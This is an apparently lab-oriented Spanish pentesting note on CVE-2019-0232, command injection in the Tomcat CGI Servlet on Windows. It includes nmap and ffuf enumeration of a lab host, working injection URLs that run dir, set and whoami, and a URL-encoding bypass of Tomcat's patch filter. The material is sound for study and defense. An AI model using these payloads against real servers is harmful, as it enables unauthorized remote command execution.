---
tags:
  - Web/Red-Team
  - CGI
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[01 - Ataques a GitLab]]"
Nota siguiente: "[[01 - Shellshock]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

El **CGI Servlet** de [[00 - Descubrimiento y enumeración de Tomcat|Tomcat]] permite ejecutar scripts externos (Perl, Python, Bash, `.bat`). En Windows, con `enableCmdLineArguments=true`, un fallo de validación abre **command injection**.

# CVE-2019-0232

<mark style="background: #FF5582A6;">RCE en Tomcat sobre **Windows** con el CGI Servlet + `enableCmdLineArguments=true`</mark>. Esa opción hace que la *query string* se pase como argumentos al script CGI; en Windows, sin validar, se inyectan comandos. Afecta a 9.0.0.M1–9.0.17, 8.5.0–8.5.39 y 7.0.0–7.0.93.

# Enumeración

```shell-session
$ nmap -p- -sC -Pn 10.129.204.227 --open
8080/tcp  open  http-proxy  |_http-title: Apache Tomcat/9.0.17
```

El directorio CGI por defecto es **`/cgi`**. Se fuzzea buscando scripts (en Windows, `.bat`):

```shell-session
$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
[Status: 200] welcome        # → /cgi/welcome.bat
```

# Explotación

El separador de comandos batch es `&`. Sobre el script válido:

```http
# Ejecutar dir
http://10.129.204.227:8080/cgi/welcome.bat?&dir

# Volcar variables de entorno (revela rutas, SCRIPT_FILENAME...)
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

> [!warning]+ Dos obstáculos y sus bypass
> 1. <mark style="background: #FFB86CA6;">El `PATH` está vacío</mark> (lo confirma `set`), así que hay que **hardcodear la ruta completa** del ejecutable: `?&c:\windows\system32\whoami.exe`.
> 2. Tomcat parcheó con una regex que bloquea caracteres especiales → el payload anterior da "invalid character". <mark style="background: #8000E1A6;">Se evade con **URL-encoding**</mark>:
> ```http
> http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
> ```

> [!info]+ Modernización
> El CGI Servlet es poco común hoy (desaconsejado), pero aparece en Tomcat sobre Windows en instalaciones antiguas. Si `8009/ajp` está abierto, combinar con [[01 - Ataques a Tomcat|Ghostcat]]. Enumerar con `ffuf`/`gobuster` sobre `/cgi/` con extensiones `.bat`,`.cmd`; `nuclei -tags tomcat,cve`.

El otro gran fallo de CGI, en Bash: [[01 - Shellshock]].
